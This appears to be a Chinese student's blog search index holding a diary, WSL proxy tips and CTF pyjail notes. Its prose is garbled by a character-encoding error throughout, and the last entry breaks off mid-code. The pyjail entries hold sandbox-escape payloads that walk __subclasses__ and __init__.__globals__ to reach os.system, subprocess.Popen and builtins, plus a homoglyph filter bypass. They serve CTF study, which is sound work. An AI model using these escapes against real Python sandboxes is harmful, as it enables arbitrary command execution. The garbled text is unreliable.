<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>å¤§äºŒæ—¥è®°-æš‘æœŸé›†è®­</title>
      <link href="/2025/08/31/%E5%A4%A7%E4%BA%8C%E6%97%A5%E8%AE%B0-%E6%9A%91%E6%9C%9F%E9%9B%86%E8%AE%AD/"/>
      <url>/2025/08/31/%E5%A4%A7%E4%BA%8C%E6%97%A5%E8%AE%B0-%E6%9A%91%E6%9C%9F%E9%9B%86%E8%AE%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="å¤§äºŒæ—¥è®°-æš‘æœŸé›†è®­"><a href="#å¤§äºŒæ—¥è®°-æš‘æœŸé›†è®­" class="headerlink" title="å¤§äºŒæ—¥è®°-æš‘æœŸé›†è®­"></a>å¤§äºŒæ—¥è®°-æš‘æœŸé›†è®­</h1><p>å¤§äºŒç”Ÿæ´»å°±è¿™æ ·å¼€å§‹äº†ï¼Œä¸çŸ¥ä¸è§‰ä¹Ÿæˆäº†å­¦æ ¡çš„è€ç™»ã€‚</p><p>é›†è®­çš„ç”Ÿæ´»å€’æ˜¯æ²¡å•¥å¯è¯´çš„ï¼Œå¬è¯¾æ•ˆç‡å’Œæ­£å¸¸åˆ«æ— äºŒè‡´ï¼ŒåŸºæœ¬ä¸Šæ˜¯åœ¨å†™å¸ƒç½®çš„ä½œä¸šã€‚æ¯å¤©éƒ½å¯¹ç€ vscode åœ¨é”®ç›˜ä¸Šæ•²å‡»ï¼Œä¸€å¤©ä¹Ÿå°±è¿‡å»äº†ã€‚</p><p>è´ªåƒè›‡å¯¹æŠ—èµ›å€’æ˜¯å¾ˆæœ‰è¶£çš„ç»“è¯¾æ´»åŠ¨ï¼Œä¹Ÿç®—å¾—ä¸Šæ˜¯ä¿¡é™¢çš„æ‚ ä¹…å†å²ä¼ ç»Ÿäº†ï¼ŒåŸºæœ¬ä»é›¶å¼€å§‹å†™çš„ç¨‹åºç”šè‡³æ¯” cs61b ä¸Šå†™çš„ gitlet æ›´è®©äººå°è±¡æ·±åˆ»ã€‚æœç´¢ã€å¯»è·¯ã€åšå¼ˆä¹Ÿç¡®å®è®©æˆ‘çœ‹åˆ°äº†ç®—æ³•åœ¨ç«èµ›ä¹‹å¤–çš„æ´»åŠ›ã€‚</p><p>åŒæ—¶è¿™åº”è¯¥ä¹Ÿç®—æ˜¯æˆ‘å¤§é‡ä½¿ç”¨ ai è¾…åŠ©ç¼–ç¨‹çš„å¼€å§‹ã€‚å¾®è½¯çœŸæ˜¯å¤§å–„äººï¼Œå…è´¹ copilot pro ç”¨åˆ°çˆ½ã€‚ä½†ç¡®å®ä¼šå‘ç°å½“è„‘å­é‡Œæ²¡æœ‰è§„åˆ’ï¼Œåªæ˜¯ä¸€å‘³å¾—ç”¨è‡ªç„¶è¯­è¨€å‘ ai æè¿°è‡ªå·±çš„é—®é¢˜æ—¶ï¼Œå¾—åˆ°çš„ç»“æœå¾€å¾€ä¸å°½å¦‚äººæ„ã€‚æ¯•ç«Ÿ ai ä¹Ÿåªæ˜¯ä¸ªå·¥å…·ï¼Œä¸èƒ½å®Œå…¨ä»£æ›¿äººç±»çš„æ€è€ƒã€‚äºæ˜¯åˆ°æœ€åæˆ‘å°±å¾—åˆ°äº†ä¸€ä¸ª 3000 è¡Œçš„ shitã€‚åœ¨å†³èµ›æš´æ¯™ä¸¤æ¬¡é—æ†¾ä¸‰ç­‰å¥–ã€‚</p><p>ai çš„å¼Šç—…åŒ…æ‹¬ä½†ä¸é™äºï¼š</p><ol><li>ç»™çš„æ–‡æ¡£æ˜¯ä¸çœ‹çš„</li><li>è¦æ±‚ä¿®æ”¹ä»£ç æ˜¯å·æ‡’çš„</li></ol>]]></content>
      
      
      <categories>
          
          <category> å¤§äºŒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ—¥è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wslå¸¸ç”¨</title>
      <link href="/2025/08/31/wsl%E5%B8%B8%E7%94%A8/"/>
      <url>/2025/08/31/wsl%E5%B8%B8%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="ç½‘ç»œç›¸å…³"><a href="#ç½‘ç»œç›¸å…³" class="headerlink" title="ç½‘ç»œç›¸å…³"></a>ç½‘ç»œç›¸å…³</h2><h3 id="ç½‘ç»œé…ç½®é—®é¢˜"><a href="#ç½‘ç»œé…ç½®é—®é¢˜" class="headerlink" title="ç½‘ç»œé…ç½®é—®é¢˜"></a>ç½‘ç»œé…ç½®é—®é¢˜</h3><p>è·å–ç½‘ç»œé…ç½®, wsl ç«¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wslinfo --networking-mode</span><br></pre></td></tr></table></figure><h3 id="apt-ä¸ä¼šè‡ªåŠ¨ä½¿ç”¨-windows-ä»£ç†ï¼Œå³ä½¿æ˜¯åœ¨è™šæ‹Ÿç½‘å¡åŠ -mirrored-æ¨¡å¼"><a href="#apt-ä¸ä¼šè‡ªåŠ¨ä½¿ç”¨-windows-ä»£ç†ï¼Œå³ä½¿æ˜¯åœ¨è™šæ‹Ÿç½‘å¡åŠ -mirrored-æ¨¡å¼" class="headerlink" title="apt ä¸ä¼šè‡ªåŠ¨ä½¿ç”¨ windows ä»£ç†ï¼Œå³ä½¿æ˜¯åœ¨è™šæ‹Ÿç½‘å¡åŠ  mirrored æ¨¡å¼"></a>apt ä¸ä¼šè‡ªåŠ¨ä½¿ç”¨ windows ä»£ç†ï¼Œå³ä½¿æ˜¯åœ¨è™šæ‹Ÿç½‘å¡åŠ  mirrored æ¨¡å¼</h3><ol><li><p>è®¾ç½®ä»£ç†:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;http://localhost:7890&quot;</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">&quot;http://localhost:7890&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>æµ‹è¯• apt çš„ç½‘ç»œè¿æ¥æ–¹å¼:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update -o Debug::Acquire::http=<span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>ä½†<code>sudo</code>é»˜è®¤ä¸ä¼šç»§æ‰¿ç”¨æˆ·ç¯å¢ƒå˜é‡ï¼Œè§£å†³æ–¹æ³•ï¼š</p><ol><li><p>åœ¨ <code>/etc/apt/apt.conf.d/</code> ä¸‹æ–°å»ºä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚ <code>/etc/apt/apt.conf.d/proxy.conf</code>ï¼Œä½†é…ç½®å®Œæˆåé‡æ–°ä½¿ç”¨<code>sudo apt update -o Debug::Acquire::http=true</code>é€Ÿåº¦æ˜æ˜¾å˜å¿«ä½†ä»æ˜¯ GET ç›´æ¥è®¿é—®ï¼Œï¼ˆä¸æ‡‚ï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Acquire &#123;</span><br><span class="line">HTTP::proxy <span class="string">&quot;http://localhost:7890&quot;</span>;</span><br><span class="line">HTTPS::proxy <span class="string">&quot;http://localhost:7890&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ol><h2 id="è·¯å¾„ç›¸å…³"><a href="#è·¯å¾„ç›¸å…³" class="headerlink" title="è·¯å¾„ç›¸å…³"></a>è·¯å¾„ç›¸å…³</h2><h3 id="è¾“å‡ºç»å¯¹è·¯å¾„"><a href="#è¾“å‡ºç»å¯¹è·¯å¾„" class="headerlink" title="è¾“å‡ºç»å¯¹è·¯å¾„"></a>è¾“å‡ºç»å¯¹è·¯å¾„</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">realpath</span> ~/node_modules/prettier</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Pyjail ç»ƒä¹ </title>
      <link href="/2025/08/26/Pyjail-%E7%BB%83%E4%B9%A0/"/>
      <url>/2025/08/26/Pyjail-%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="HNCTF-2022-Week1-calc-jail-beginner-level1-JAIL"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level1-JAIL" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL)</h2><p>è¿‡æ»¤äº† â€˜ â€œ i b</p><p>è€ƒè™‘ä½¿ç”¨ <code>chr()</code> æ‹¼æ¥å­—ç¬¦ä¸²</p><h2 id="HNCTF-2022-Week1-calc-jail-beginner-level2-JAIL"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level2-JAIL" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL)</h2><p>é™åˆ¶å­—ç¬¦ä¸²é•¿åº¦</p><p>ä½¿ç”¨ <code>input()</code> è¯»å–è¾“å…¥</p><h2 id="HNCTF-2022-Week1-calc-jail-beginner-level2-5-JAIL"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level2-5-JAIL" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL)</h2><p>é™åˆ¶å­—ç¬¦ä¸²é•¿åº¦åŒæ—¶è¿‡æ»¤äº†<code>exec</code> <code>eval</code> <code>input()</code></p><p>è€ƒè™‘ä½¿ç”¨ unicode ç¢°æ’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the python jail</span><br><span class="line">Let<span class="string">&#x27;s have an beginner jail of calc</span></span><br><span class="line"><span class="string">Enter your expression and I will evaluate it for you.</span></span><br><span class="line"><span class="string">&gt; ğ“®val(inpğ“¾t())</span></span><br><span class="line"><span class="string">Oh hacker!</span></span><br></pre></td></tr></table></figure><p>åŸå› æœªçŸ¥</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pyjailå­¦ä¹ ç¬”è®°_åŸºç¡€å†…å®¹ç¯‡</title>
      <link href="/2025/08/13/pyjail%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E5%9F%BA%E7%A1%80%E5%86%85%E5%AE%B9%E7%AF%87/"/>
      <url>/2025/08/13/pyjail%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E5%9F%BA%E7%A1%80%E5%86%85%E5%AE%B9%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="builtins"><a href="#builtins" class="headerlink" title="builtins"></a>builtins</h2><p><code>builtins</code> æ˜¯ Python çš„å†…ç½®æ¨¡å—ï¼Œæä¾›äº†ä¸€äº›å¸¸ç”¨çš„å‡½æ•°å’Œå¯¹è±¡ã€‚</p><h2 id="å†…çœæœºåˆ¶-Introspection"><a href="#å†…çœæœºåˆ¶-Introspection" class="headerlink" title="å†…çœæœºåˆ¶ (Introspection)"></a>å†…çœæœºåˆ¶ (Introspection)</h2><p>å†…çœæœºåˆ¶å…è®¸ç¨‹åºåœ¨è¿è¡Œæ—¶æ£€æŸ¥å¯¹è±¡çš„ç±»å‹å’Œå±æ€§ã€‚</p><h3 id="dir"><a href="#dir" class="headerlink" title="dir()"></a><code>dir()</code></h3><p><code>dir()</code> å‡½æ•°ç”¨äºæŸ¥æ‰¾å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ã€‚å®ƒè¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€æœ‰å¯ç”¨å±æ€§å’Œæ–¹æ³•åç§°çš„åˆ—è¡¨ã€‚</p><h3 id="type"><a href="#type" class="headerlink" title="type()"></a><code>type()</code></h3><p><code>type()</code> å‡½æ•°ç”¨äºè¿”å›å¯¹è±¡çš„ç±»å‹ã€‚å®ƒå¯ä»¥ç”¨äºæ£€æŸ¥å˜é‡çš„ç±»å‹æˆ–è·å–å¯¹è±¡çš„ç±»ä¿¡æ¯ã€‚</p><h3 id="getattr-setattr-hasattr-delattr"><a href="#getattr-setattr-hasattr-delattr" class="headerlink" title="getattr()&#x2F;setattr()&#x2F;hasattr()&#x2F;delattr()"></a><code>getattr()</code>&#x2F;<code>setattr()</code>&#x2F;<code>hasattr()</code>&#x2F;<code>delattr()</code></h3><p>è¿™äº›å†…ç½®å‡½æ•°ç”¨äºè·å–ã€è®¾ç½®ã€æ£€æŸ¥å’Œåˆ é™¤å¯¹è±¡çš„å±æ€§ã€‚</p><h3 id="help"><a href="#help" class="headerlink" title="help()"></a><code>help()</code></h3><p><code>help()</code> å‡½æ•°ç”¨äºæŸ¥çœ‹å¯¹è±¡çš„å¸®åŠ©æ–‡æ¡£ã€‚å®ƒå¯ä»¥æä¾›æœ‰å…³å¯¹è±¡çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ–¹æ³•ã€å±æ€§å’Œç”¨æ³•ç¤ºä¾‹ã€‚</p><h3 id="globals-locals"><a href="#globals-locals" class="headerlink" title="globals()&#x2F;locals()"></a><code>globals()</code>&#x2F;<code>locals()</code></h3><p><code>globals()</code> å‡½æ•°ç”¨äºè¿”å›å½“å‰å…¨å±€ç¬¦å·è¡¨çš„å­—å…¸ï¼ŒåŒ…å«æ‰€æœ‰å…¨å±€å˜é‡å’Œå‡½æ•°ã€‚</p><p><code>locals()</code> å‡½æ•°ç”¨äºè¿”å›å½“å‰å±€éƒ¨ç¬¦å·è¡¨çš„å­—å…¸ï¼ŒåŒ…å«æ‰€æœ‰å±€éƒ¨å˜é‡å’Œå‡½æ•°ã€‚</p><h3 id="vars"><a href="#vars" class="headerlink" title="vars()"></a><code>vars()</code></h3><p><code>vars()</code> å‡½æ•°ç”¨äºè¿”å›å¯¹è±¡çš„ <code>__dict__</code> å±æ€§ï¼Œå³å¯¹è±¡çš„å±æ€§å­—å…¸ã€‚</p><h2 id="python-é­”æœ¯æ–¹æ³•"><a href="#python-é­”æœ¯æ–¹æ³•" class="headerlink" title="python é­”æœ¯æ–¹æ³•"></a>python é­”æœ¯æ–¹æ³•</h2><p>é­”æœ¯æ–¹æ³•æ˜¯ Python ä¸­ä»¥åŒä¸‹åˆ’çº¿å¼€å¤´å’Œç»“å°¾çš„æ–¹æ³•ã€‚è¿™äº›æ–¹æ³•ä¹Ÿè¢«ç§°ä¸ºâ€œç‰¹æ®Šæ–¹æ³•â€æˆ–â€œdunder æ–¹æ³•â€ã€‚å®ƒä»¬å…è®¸å¼€å‘è€…è‡ªå®šä¹‰ç±»çš„è¡Œä¸ºï¼Œä¾‹å¦‚å¯¹è±¡çš„åˆ›å»ºã€è¡¨ç¤ºå’Œè¿ç®—ç­‰ã€‚</p><h3 id="å¸¸è§çš„é­”æœ¯æ–¹æ³•"><a href="#å¸¸è§çš„é­”æœ¯æ–¹æ³•" class="headerlink" title="å¸¸è§çš„é­”æœ¯æ–¹æ³•"></a>å¸¸è§çš„é­”æœ¯æ–¹æ³•</h3><ul><li><code>__init__(self, ...)</code>ï¼šæ„é€ æ–¹æ³•ï¼Œç”¨äºåˆå§‹åŒ–å¯¹è±¡ã€‚</li><li><code>__str__(self)</code>ï¼šè¿”å›å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºï¼Œç”¨äº <code>print()</code> å‡½æ•°ã€‚</li><li><code>__repr__(self)</code>ï¼šè¿”å›å¯¹è±¡çš„å®˜æ–¹å­—ç¬¦ä¸²è¡¨ç¤ºï¼Œç”¨äºè°ƒè¯•ã€‚</li><li><code>__len__(self)</code>ï¼šè¿”å›å¯¹è±¡çš„é•¿åº¦ï¼Œç”¨äº <code>len()</code> å‡½æ•°ã€‚</li><li><code>__getitem__(self, key)</code>ï¼šæ”¯æŒç´¢å¼•è®¿é—®ï¼Œç”¨äº <code>obj[key]</code>ã€‚</li><li><code>__setitem__(self, key, value)</code>ï¼šæ”¯æŒç´¢å¼•èµ‹å€¼ï¼Œç”¨äº <code>obj[key] = value</code>ã€‚</li><li><code>__delitem__(self, key)</code>ï¼šæ”¯æŒç´¢å¼•åˆ é™¤ï¼Œç”¨äº <code>del obj[key]</code>ã€‚</li><li><code>__iter__(self)</code>ï¼šè¿”å›å¯è¿­ä»£å¯¹è±¡ï¼Œç”¨äº <code>for</code> å¾ªç¯ã€‚</li><li><code>__next__(self)</code>ï¼šè¿”å›ä¸‹ä¸€ä¸ªè¿­ä»£å€¼ï¼Œç”¨äºè¿­ä»£å™¨ã€‚</li></ul><h3 id="builtins-1"><a href="#builtins-1" class="headerlink" title="__builtins__"></a><code>__builtins__</code></h3><p><code>__builtins__</code> æ˜¯ä¸€ä¸ªåŒ…å«æ‰€æœ‰å†…ç½®å¯¹è±¡çš„æ¨¡å—ï¼ŒåŒ…æ‹¬å†…ç½®å‡½æ•°ã€å¼‚å¸¸å’Œå…¶ä»–å¯¹è±¡ã€‚å¯ä»¥é€šè¿‡ <code>import builtins</code> è®¿é—®ã€‚</p><h3 id="import"><a href="#import" class="headerlink" title="__import__"></a><code>__import__</code></h3><p><code>__import__</code> æ˜¯ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºåŠ¨æ€å¯¼å…¥æ¨¡å—ã€‚å®ƒæ¥å—æ¨¡å—åç§°ä½œä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›æ¨¡å—å¯¹è±¡ã€‚</p><p>å¦‚ import sys ç›¸å½“äº<code>__import__(&#39;sys&#39;)</code>ï¼Œå¦å¤–ç”±äºå‚æ•°æ˜¯å­—ç¬¦ä¸²çš„å½¢å¼ï¼Œå› æ­¤åœ¨æŸäº›æƒ…å†µä¸‹å¯åˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼ Bypass è¿‡æ»¤</p><h3 id="class"><a href="#class" class="headerlink" title="__class__"></a><code>__class__</code></h3><p>ç”¨äºè¿”å›å¯¹è±¡çš„ç±»ã€‚</p><h3 id="base"><a href="#base" class="headerlink" title="__base__"></a><code>__base__</code></h3><p><code>__base__</code> æ˜¯ä¸€ä¸ªå±æ€§ï¼Œç”¨äºè¿”å›ç±»çš„ç›´æ¥åŸºç±»ã€‚</p><h3 id="mro"><a href="#mro" class="headerlink" title="__mro__"></a><code>__mro__</code></h3><p><code>__mro__</code> æ˜¯ä¸€ä¸ªå±æ€§ï¼Œç”¨äºè¿”å›ç±»çš„ç»§æ‰¿å…³ç³»ï¼ˆæ–¹æ³•è§£æé¡ºåºï¼‰ã€‚ç±»ä¼¼äº <code>__bases__</code>ï¼Œä½† <code>__mro__</code> åŒ…å«äº†æ‰€æœ‰åŸºç±»ï¼Œè€Œä¸ä»…ä»…æ˜¯ç›´æ¥åŸºç±»ã€‚</p><h3 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a><code>__globals__</code></h3><p><code>__globals__</code> æ˜¯ä¸€ä¸ªå±æ€§ï¼Œèƒ½å¤Ÿä»¥ <code>dict</code> çš„å½¢å¼è¿”å›å‡½æ•°ï¼ˆæ³¨æ„æ˜¯å‡½æ•°ï¼‰æ‰€åœ¨æ¨¡å—å‘½åç©ºé—´çš„æ‰€æœ‰å˜é‡ï¼Œå…¶ä¸­åŒ…å«äº†å¾ˆå¤šå·²ç»å¼•å…¥çš„ <code>modules</code>ã€‚</p><h3 id="subclasses"><a href="#subclasses" class="headerlink" title="__subclasses__"></a><code>__subclasses__</code></h3><p><code>__subclasses__</code> æ˜¯ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºè¿”å›å½“å‰ç±»çš„æ‰€æœ‰å­ç±»ã€‚</p><h3 id="dict"><a href="#dict" class="headerlink" title="__dict__"></a><code>__dict__</code></h3><p><code>__dict__</code> æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å±æ€§ï¼Œå®ƒä»¥å­—å…¸å½¢å¼å­˜å‚¨å¯¹è±¡çš„å¯å†™å±æ€§ã€‚æ¯ä¸ªå¯¹è±¡ï¼ˆåŒ…æ‹¬ç±»ã€å®ä¾‹ã€æ¨¡å—ç­‰ï¼‰éƒ½æœ‰è‡ªå·±çš„ <code>__dict__</code> å±æ€§ï¼Œé€šå¸¸ç”¨äºä¿å­˜è¯¥å¯¹è±¡çš„å‘½åç©ºé—´ï¼Œå³ä¸è¯¥å¯¹è±¡ç›¸å…³çš„æ‰€æœ‰å±æ€§å’Œå€¼ã€‚</p><h2 id="no-builtins-æ„é€ "><a href="#no-builtins-æ„é€ " class="headerlink" title="no-builtins æ„é€ "></a>no-builtins æ„é€ </h2><p>åœ¨æ²¡æœ‰å†…ç½®å‡½æ•°çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡ python å†…çœæœºåˆ¶æ¥ç»•è¿‡é™åˆ¶ï¼Œé€šè¿‡å†…ç½®ç±»é‡æ–°è·å– <code>__builtins</code> ï¼Œç„¶åå†åˆ©ç”¨ã€‚</p><h3 id="playload"><a href="#playload" class="headerlink" title="playload"></a>playload</h3><ol><li>è·å– <code>object</code> ç±»</li><li>é€šè¿‡ <code>__subclasses__</code> è·å–æ‰€æœ‰å­ç±»</li><li>åœ¨å­ç±»ä¸­æŸ¥æ‰¾é‡è½½è¿‡<code>__init__</code>å‡½æ•°çš„ç±»ï¼Œå› ä¸ºé‡è½½è¿‡<code>__init__</code>å‡½æ•°çš„<code>__globals__</code>å±æ€§ä¼šåŒ…å«<code>__builtins__</code>é”®æˆ–å…¶ä»–å¯åˆ©ç”¨å‚æ•°<ol><li>åˆ©ç”¨<code>__builtins__</code><ol><li>é€šè¿‡ <code>.__init__.__globals__[&#39;__builtins__&#39;]</code> é”®è·å–åˆ° builtins æ¨¡å—</li><li>ç”±äº builtins æ¨¡å—ä¸­åŒ…å«äº† file, eval ç­‰å‡½æ•°,æœ€åä¸€æ­¥å°±æ˜¯è°ƒç”¨è¿™äº›å‡½æ•°.</li></ol></li><li>åˆ©ç”¨å…¶ä»–å‡½æ•°. å› ä¸º <code>__globals__</code> ä¸­ä¹Ÿä¼šåŒ…å«å·²ç»å¯¼å…¥çš„æ¨¡å—,æ‰€ä»¥åœ¨æŸäº›å­ç±»çš„ <code>.__init__.__globals__</code> ä¸­ä¹Ÿä¼šå‘ç°è¯¸å¦‚ <code>os</code> æ¨¡å—çš„èº«å½±,å› æ­¤ç›´æ¥è°ƒç”¨å³å¯.</li></ol></li></ol><h4 id="ç›¸å…³é—®é¢˜"><a href="#ç›¸å…³é—®é¢˜" class="headerlink" title="ç›¸å…³é—®é¢˜"></a>ç›¸å…³é—®é¢˜</h4><h5 id="å¦‚ä½•å¯»æ‰¾é‡è½½è¿‡-init-å‡½æ•°çš„ç±»ï¼Ÿ"><a href="#å¦‚ä½•å¯»æ‰¾é‡è½½è¿‡-init-å‡½æ•°çš„ç±»ï¼Ÿ" class="headerlink" title="å¦‚ä½•å¯»æ‰¾é‡è½½è¿‡__init__å‡½æ•°çš„ç±»ï¼Ÿ"></a>å¦‚ä½•å¯»æ‰¾é‡è½½è¿‡<code>__init__</code>å‡½æ•°çš„ç±»ï¼Ÿ</h5><p>æ‰¾åˆ°é‡è½½è¿‡çš„<code>__init__</code>å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__</span><br></pre></td></tr></table></figure><p>åœ¨è·å–åˆå§‹åŒ–å±æ€§åï¼Œå¸¦ <code>wrapper</code> çš„è¯´æ˜æ²¡æœ‰é‡è½½ï¼Œå¯»æ‰¾ä¸å¸¦ <code>warpper</code> çš„ï¼Œå› ä¸º<code>wrapper</code>æ˜¯æŒ‡è¿™äº›å‡½æ•°å¹¶æ²¡æœ‰è¢«é‡è½½ï¼Œè¿™æ—¶å®ƒä»¬å¹¶ä¸æ˜¯ function ï¼Œä¸å…·æœ‰<code>__globals__</code>å±æ€§ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._WeakValueDictionary&#x27;</span>&gt; &lt;function _WeakValueDictionary.__init__ at <span class="number">0x00000269A1321260</span>&gt; <span class="comment"># é‡è½½è¿‡</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt; &lt;slot wrapper <span class="string">&#x27;__init__&#x27;</span> of <span class="string">&#x27;type&#x27;</span> objects&gt; <span class="comment"># æœªé‡è½½è¿‡</span></span><br></pre></td></tr></table></figure><h4 id="playload-æ”¶é›†"><a href="#playload-æ”¶é›†" class="headerlink" title="playload æ”¶é›†"></a>playload æ”¶é›†</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#os</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> == x.__init__.__globals__[<span class="string">&quot;__name__&quot;</span>] ][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;os.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#subprocess</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;subprocess&quot;</span> == x.__init__.__globals__[<span class="string">&quot;__name__&quot;</span>] ][<span class="number">0</span>][<span class="string">&quot;Popen&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;subprocess.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&#x27;Popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;Popen&#x27;</span>][<span class="number">0</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#builtins</span></span><br><span class="line"><span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>]</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span 